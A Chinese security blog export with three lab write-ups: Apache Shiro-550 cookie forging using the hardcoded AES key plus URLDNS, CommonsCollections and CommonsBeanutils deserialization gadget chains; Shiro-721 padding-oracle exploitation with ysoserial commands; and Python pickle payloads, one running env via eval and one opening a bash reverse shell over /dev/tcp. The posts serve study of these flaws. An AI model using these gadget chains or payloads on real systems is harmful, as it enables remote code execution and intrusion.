<p>这里我们能看到序列化与加密手法</p>
<p><img src="/posts/96409491/1763556645509-67ae7483-56f1-4ca4-bc19-8d8f3e25ad80.png" alt="img"></p>
<p><img src="/posts/96409491/1763556827558-1dd4d137-4404-40bf-9acc-f4e4d594ae62.png" alt="img"></p>
<p>这里和之前的解密差不多了</p>
<p><img src="/posts/96409491/1763556891711-f110a7a5-b953-4885-8cd4-e373ec51cf7e.png" alt="img"></p>
<p>还是会找到这个密钥</p>
<p><img src="/posts/96409491/1763557238613-08961e4e-65c6-419d-b8bf-a287c08c5234.png" alt="img"></p>
<p>通过aes加密后，这里会进行base64编码</p>
<p>至此cookie就加密好了，我们只需要按照流程伪造cookie，传入后会自动解密，反序列化，然后触发readobject，这时如果我们构造的恶意数据，对readobject进行了重写，就造成了漏洞的存在。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>脚本直接搬大佬的了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># －*-* coding:utf-8</span><br><span class="line"># @Time    :  2022/7/13 17:36</span><br><span class="line"># @Author  : Drunkbaby</span><br><span class="line"># @FileName: poc.py</span><br><span class="line"># @Software: VSCode</span><br><span class="line"># @Blog    ：https://drun1baby.github.io/</span><br><span class="line"></span><br><span class="line">from email.mime import base</span><br><span class="line">from pydoc import plain</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from turtle import mode</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_file_data(filename):</span><br><span class="line"> with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line"> data = f.read()</span><br><span class="line"> return data</span><br><span class="line"></span><br><span class="line">def aes_enc(data):</span><br><span class="line"> BS = AES.block_size</span><br><span class="line"> pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = uuid.uuid4().bytes</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"> return ciphertext</span><br><span class="line"></span><br><span class="line">def aes_dec(enc_data):</span><br><span class="line"> enc_data = base64.b64decode(enc_data)</span><br><span class="line"> unpad = lambda s: s[:-s[-1]]</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = enc_data[:16]</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[16:])</span><br><span class="line"> plaintext = unpad(plaintext)</span><br><span class="line"> return plaintext</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"> data = get_file_data(&quot;ser.bin&quot;)</span><br><span class="line"> print(aes_enc(data))</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p>URLDNS链是之前写的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class URLDNS &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap =new HashMap&lt;URL,Integer&gt;();</span><br><span class="line">        URL url = new URL(&quot;http://487zx4.dnslog.cn&quot;);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line"></span><br><span class="line">        Field f = c.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(url, 1);</span><br><span class="line">        hashmap.put(url,1);</span><br><span class="line">        f.set(url,-1);</span><br><span class="line">        serilize(hashmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serilize(Object object) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser2.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object deserilize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不要反序列化，用序列化得到的ser.bin 然后发包的时候把JSESSIONID去掉,不去掉的话会不成功</p>
<p><img src="/posts/96409491/1763560187707-95f2b36d-04f5-458b-a4b7-1b30177a5432.png" alt="img"></p>
<p>我们来试一下cc链，主要注意点就是不要有数组，要不然打不通</p>
<p><img src="/posts/96409491/1765370842161-9bffc37d-1271-46a5-9188-e3f888655431.png" alt="img"></p>
<p>感觉会是这里的原因（还要多学一学）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc11 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(templates, &quot;cc2&quot;);</span><br><span class="line">        byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">        byte[][] b1 = &#123;b&#125;;</span><br><span class="line">        Field b2 = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        b2.setAccessible(true);</span><br><span class="line">        b2.set(templates, b1);</span><br><span class="line"></span><br><span class="line">        Field f = aClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(templates, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap1, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, &quot;eee&quot;);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz = LazyMap.class;</span><br><span class="line">        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazyMap, invokerTransformer);</span><br><span class="line">        serialize(hashMap2);</span><br><span class="line">//        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/96409491/1765370467365-ad7daf23-bd6c-4ed9-ba58-22a2403ad3ff.png" alt="img"></p>
<p>在接下来是cb链子的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line">import javax.xml.ws.spi.Invoker;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CB &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">        byte[][] b1 = &#123;b&#125;;</span><br><span class="line"></span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(templates, b1);</span><br><span class="line"></span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(templates,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        tfactory.setAccessible(true);</span><br><span class="line">        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">//        templates.getOutputProperties();</span><br><span class="line"></span><br><span class="line">//        PropertyUtils propertyUtils = new PropertyUtils();</span><br><span class="line">//        propertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = new BeanComparator();</span><br><span class="line"></span><br><span class="line">//        beanComparator.compare(templates,templates);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line"></span><br><span class="line">        Class aClass1 = beanComparator.getClass();</span><br><span class="line">        Field property = aClass1.getDeclaredField(&quot;property&quot;);</span><br><span class="line">        property.setAccessible(true);</span><br><span class="line">        property.set(beanComparator,&quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">        Class aClass2 = priorityQueue.getClass();</span><br><span class="line">//        Field priority = aClass2.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">//        priority.setAccessible(true);</span><br><span class="line">//        priority.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        Field queueField = aClass2.getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        queueField.setAccessible(true);</span><br><span class="line">        Object[] queueArray = (Object[]) queueField.get(priorityQueue);</span><br><span class="line"></span><br><span class="line">        queueArray[0] = templates;</span><br><span class="line">        queueArray[1] = templates;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        //unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void  serialize(Object o) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/96409491/1765452753726-7a877df9-c925-49f1-9d78-f1123deaf510.png" alt="img"></p>
<p>至此就结束了</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B</a></p>
<p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=0.0.header_right.fav_list.click&vd_source=a4eba559e280bf2f1aec770f740d0645">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=0.0.header_right.fav_list.click&amp;vd_source=a4eba559e280bf2f1aec770f740d0645</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>shiro框架</category>
      </categories>
  </entry>
  <entry>
    <title>shiro721</title>
    <url>/posts/ad82e6ae/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shiro721是shiro550更新过后的一个版本，不同于shiro550，它使用的是动态密钥对Cookie值rememberMe进行的加密，这样就避免了攻击者的攻击，但是真的能避免吗?既然有这个漏洞，那就说明无法避免，主要还是因为shiro使用了AES-CBC的加密方式，这时我们就可以使用Padding Oracle Attack的方法（不需要密钥也可以伪造密文）进行攻击。</p>
<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p><a href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war">https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war</a></p>
<p>下载war包，解压之后打开这个项目将cc换成3.2.1的版本</p>
<p>创建一个新的项目</p>
<p><img src="/posts/ad82e6ae/1765527984969-f96a4728-40c1-4dfc-a5ca-1b7603684233.png" alt="img"></p>
<p>踩坑点：不要使用jdk版本8u65，版本太低会报错误</p>
<p>将刚刚解压的war包里的内容放入webapp中</p>
<p><img src="/posts/ad82e6ae/1765528155337-35ec5ed2-37c7-4401-be5b-c885a3acfdc6.png" alt="img"></p>
<p>依赖的添加，在lib下</p>
<p><img src="/posts/ad82e6ae/1765528561953-3db48c09-159f-455b-940a-32ef40831a3c.png" alt="img"></p>
<p>添加tomcat启动（记得工件）</p>
<p><img src="/posts/ad82e6ae/1765528511632-dc042a14-e2bd-47e9-8cbe-44cdd1f7d247.png" alt="img"></p>
<p>最后启动环境，我们可以看到如下界面</p>
<p><img src="/posts/ad82e6ae/1765528618286-b7657c61-68be-43dc-a8ec-e8e410ef6bec.png" alt="img"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用ysoserial工具生成URLDNS的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS http://56db4471.log.dnslog.pp.ua. &gt; payload.class</span><br></pre></td></tr></table></figure>

<p>然后使用攻击的exp伪造密文<a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shiro_exp.py http://192.168.50.249:8080/shiro721_war_exploded/account //oAmLlP1RoVmKsmOls9yuLFng5P5iFPNerBYYR4m1FKkT0CrTZfB+GS2N6WHkGFRonZLpGViL03gr/Va03lNjujp33aoIg4NrP4LSdEkYyG6WDB5gpcb2p92377Hnmxs+6giL0dtg27Ei+BeQsbtjOLtFhKr+rHofWJ3relUSdlkzhele6Eit5pO6CAj2Cg7gbk56fXXvvz71ODonRfrQRNmoTSaMe8i0C73P1SSTIsnJFAdXSWwHE5t0S4cTGjGLHz2cq03JAlbNTf+dGCMtU+/brmk/33ZGVER1aixi/4a+SNm428Wq7dRURcfmVnvPlH7J1AneX0W5r4OmH9lfJy4JXwVS6WGNQL35ZX2dbzVFMuZ99aKavaDSN1W+ReSzIoQFgqz+/3vuYhkETdmXBFMTFmraO8PY6PSW5NQrkGDiN9M4xYp2X2zYFtexZEr09fiCXS15YwxOozG7rM0b5VrO35W8ZSBDosCfwAQrFJcYkCKWQTcXkK9W/wi2lx payload.class</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ad82e6ae/1765627809298-3c47531d-89d7-4467-a24d-0e279d028f4c.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765627777625-68aa44f1-6ea6-4cfe-a064-f004a9f3ae4d.png" alt="img"></p>
<p>漏洞利用成功</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在我们之前分析的shiro550中，我们可以看到这里的密钥使用是固定密钥，因此可以伪造恶意cookie值进行攻击</p>
<p><img src="/posts/ad82e6ae/1763539149760-04366d1d-8a30-45b7-823d-1045145e945b.webp" alt="img"></p>
<p>但是在shiro721中，我们可以看到密钥是进行的动态获取的</p>
<p><img src="/posts/ad82e6ae/1765777319411-223bd912-fbec-480a-ad01-2c7874b67edd.png" alt="img"></p>
<p>我们在这里打一个断点，调试一下</p>
<p>这里有密钥的生成器，跟进一下</p>
<p><img src="/posts/ad82e6ae/1765777507119-2dd23cc2-5e15-463d-9b26-989d658a60b4.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765777587436-c88b0e6d-e1f7-4224-95af-f5375d25425a.png" alt="img"></p>
<p>然后跟进engineInit，会发现对AES算法进行一个初始化<img src="/posts/ad82e6ae/1765777740985-fd5ea43c-ceea-4a12-a5ba-8170fd6b23b3.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765778917427-94a3efa7-5081-4aac-ad86-977cb0670a4d.png" alt="img"></p>
<p>我们从这里进去看一下</p>
<p><img src="/posts/ad82e6ae/1765778958549-c3d1654b-8074-49db-996b-f6925e2045c1.png" alt="img"></p>
<p>在进这边</p>
<p><img src="/posts/ad82e6ae/1765779030405-496ba567-a017-44e7-9288-51f711bfed41.png" alt="img"></p>
<p>可以看到这里对密钥序列进行了一个获取</p>
<p>至此分析就结束了</p>
<hr>
<h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>还有一些分析点，是和shiro550类似的，这里主要讲解一下，Padding Oracle Attack这种攻击的主要利用。</p>
<p>先给大家看一个图</p>
<p><img src="/posts/ad82e6ae/1765785896392-1da1a5fb-b896-40c2-9beb-eb90eb475ea8.png" alt="img"></p>
<p>AES是分块加密的这里是8个字节为一个块进行加密，**表示任意数据，第一个缺少一个字节就padding 01，然后第二个缺少两个字节，就padding 02 02 以此类推</p>
<p>注意点：当你的字节满了之后就会在开一个数据块供你padding，例如：** ** ** ** ** ** ** ** 08 08 08 08 08 08 08 08.</p>
<hr>
<p>以上是填充规则，至于怎么爆破的我们来简单聊一下：</p>
<p>首先，你是不知道密钥的，但是你想要解密C2,我们这时就需要利用到C1（这里假设C1扮演IV角色），我们要对C1进行逐字节破解。</p>
<ul>
<li>破解最后一个字节，由上述描述，填充规则要满足01，IV全部置零，修改最后一个字节从0x00到0xFF，然后把每次请求都发送给服务器，直到服务器为200然后计算中间值，然后就可以计算出明文字节</li>
<li>同样破解第二个字节，就要满足，填充规则为0x02 0x02 ，我们已经知道最后一位中间值，可以利用这个中间值算出得到最后以为0x02的IV，然后只要爆破倒数第二位的IV位0x02的中间值就可以了，同样时遍历0x00到0xFF，最后得到第二个字节的中间字，然后计算出第二个字节的明文</li>
<li>以此类推……，直到解密出整个块的明文。</li>
</ul>
<p>这是解密过程，逆着来就可以对数据进行加密了。（通过这种方法就不需要密钥伪造密文了）</p>
<hr>
<h2 id="在shiro721中对Padding-Oracle-Attack的利用"><a href="#在shiro721中对Padding-Oracle-Attack的利用" class="headerlink" title="在shiro721中对Padding Oracle Attack的利用"></a>在shiro721中对Padding Oracle Attack的利用</h2><p>那么明白这个点之后我们需要爆破攻击吧，怎么进行攻击呢？</p>
<p>这里就需要有能爆破的条件了（也就是判断条件）</p>
<p>来跟一下</p>
<p><img src="/posts/ad82e6ae/1765790650140-d3454e25-cee1-497a-9f0a-9dcda1586ce5.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765790763989-1654f8f4-0c9c-42c7-a52d-635915040298.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765790777092-5df8ce25-4b92-4a28-a2f1-8d306b78cb7e.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765790790824-6b581968-5863-4e75-a184-ab72e85dee83.png" alt="img"></p>
<p>这里的有IllegalBlockSizeException, BadPaddingException就是检测块大小异常和错误的填充的，这个错误会被抛到顶层getRememberPrincipals方法中，然后这个方法会调用onRememberedPrincipalFailure方法</p>
<p><img src="/posts/ad82e6ae/1765791080607-06713c84-a45c-4b94-98c4-27e471f0a178.png" alt="img"></p>
<p>onRememberedPrincipalFailure会调用到removeFrom</p>
<p><img src="/posts/ad82e6ae/1765792064345-83506811-09be-4f7e-93e2-edef78bea63e.png" alt="img"></p>
<p>如果padding不正确，这里就会返回Set-Cookie: rememberMe&#x3D;deleteMe</p>
<p>看一下正确的情况，拿cookie解密，改填充</p>
<p><img src="/posts/ad82e6ae/1765855521656-cd6e5d6a-27e9-4f80-8690-f07f22f49e66.png" alt="img"></p>
<p>这里填充了16个字节 10的10进制是16</p>
<p><img src="/posts/ad82e6ae/1765856696470-abb2bbfd-adad-4c79-a852-e96d0ac51e49.png" alt="img"></p>
<p><img src="/posts/ad82e6ae/1765856686936-5bda3036-452f-4026-84ea-b1c6bc91ba05.png" alt="img"></p>
<p>如果padding正确服务器会正常响应</p>
<hr>
<p>写个小问题哈，当时调试的时候遇到的，在复现最后一个的时候，想看一眼密钥是啥，然后发现最后解密的时候一直是固定密钥，当时是真懵逼了，只能去调试一下怎么回事</p>
<p><img src="/posts/ad82e6ae/1765853945968-8ceb2a91-b02c-4719-b28f-951c02b96303.png" alt="img"></p>
<p>然后发现会使用固定密钥对key进行重新的赋值，其实我们向上找找会发现这个</p>
<p><img src="/posts/ad82e6ae/1765854474484-8aa7f052-7c75-4a02-ab15-6166df74701e.png" alt="img"></p>
<p>会重新从rememberMeManager.cipherKey 进行加载shiro的固定key，这里其实是在配置文件中改一下</p>
<p><img src="/posts/ad82e6ae/1765854585812-208c4ccb-d6c3-4f53-bd87-ce64060f5ff6.png" alt="img"></p>
<p>打个注释就好了</p>
<hr>
<p>参考：<a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E5%9C%A8-shiro721-%E4%B8%AD%E7%9A%84-Padding-Oracle-Attack">https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E5%9C%A8-shiro721-%E4%B8%AD%E7%9A%84-Padding-Oracle-Attack</a></p>
<p><a href="https://www.cnblogs.com/poziiey/p/12454625.html">https://www.cnblogs.com/poziiey/p/12454625.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>shiro框架</category>
      </categories>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/posts/2d71dd35/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考：<a href="https://j1rry-learn.github.io/posts/ctf%E9%A2%98%E5%9E%8B-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/">https://j1rry-learn.github.io/posts/ctf%E9%A2%98%E5%9E%8B-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/</a></p>
<p>pickle模块基于python主要牵扯到两个函数，一个是dumps另一个是loads，类似于emmmm，php的serialize和unserialize方法，危害还是很大的，可以直接进行命令执行。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
<li>pickle.dumps(obj[, protocol])</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">功能：将obj对象序列化为string形式，而不是存入文件中。</span><br><span class="line">参数:</span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>

<ol>
<li>pickle.loads(string)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">功能：从string中读出序列化前的obj对象。</span><br><span class="line">参数:</span><br><span class="line">string：文件名称。</span><br></pre></td></tr></table></figure>

<p>总结来说，dumps是序列化成一个字符串，而loads是反序列化成一个对象。</p>
<ol>
<li>有关的魔术方法</li>
</ol>
<ul>
<li><strong>reduce</strong>: 构造方法，在反序列化的时候自动执行</li>
<li><strong>setstate</strong>:  在反序列化时自动执行。它可以在对象从其序列化状态恢复时，对对象进行自定义的状态还原。</li>
</ul>
<ol>
<li>payload案例</li>
</ol>
<ul>
<li>无os模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class A(object):  //创建一个新式类调用__reduce__方法</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;,))//最后一个,是创建一个单元素元组</span><br><span class="line"></span><br><span class="line">a=A()</span><br><span class="line">a=pickle.dumps(a);</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></table></figure>

<ul>
<li>有os模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return(os.system,(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;,))</span><br><span class="line">a=A()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>

<h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><h4 id="使用opcode绕过过滤"><a href="#使用opcode绕过过滤" class="headerlink" title="使用opcode绕过过滤"></a>使用opcode绕过过滤</h4><p>opcode的介绍：</p>
<p><strong>opcode</strong>又称为<em><strong>操作码</strong></em>，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。</p>
<p>具体可参考<a href="https://xz.aliyun.com/news/7032#toc-11">https://xz.aliyun.com/news/7032#toc-11</a></p>
<p>opcode在这里：<a href="https://github.com/python/cpython/blob/main/Lib/pickle.py#L111">https://github.com/python/cpython/blob/main/Lib/pickle.py#L111</a></p>
<p>可使用的工具为：<a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p>
<p>opcode的解析：</p>
<p><img src="/posts/2d71dd35/1763897409683-7703e47d-3bb8-461e-92ca-199539f75fbe.png" alt="img"></p>
<p>获得对象入栈(代表一个MARK</p>
<p><img src="/posts/2d71dd35/1763897442256-84b521f3-90ec-488f-9625-3db56a42c89e.png" alt="img"></p>
<p>实例化一个字符串对象并且入栈</p>
<p><img src="/posts/2d71dd35/1763897473630-caf81248-fd63-459b-b715-01c54af37a19.png" alt="img"></p>
<p>将参数变成一个元组，这里的<code>/etc/passwd</code>是一个参数，我们最后用的是R操作符，所以参数一定要是一个元组，使用t操作符转换上一个MARK后的为元组，</p>
<p><img src="/posts/2d71dd35/1763897525769-f49385eb-6088-4ebb-b785-73fabdbcd79a.png" alt="img"></p>
<p>R将入栈的第一个元素作为函数，第二个为参数执行。</p>
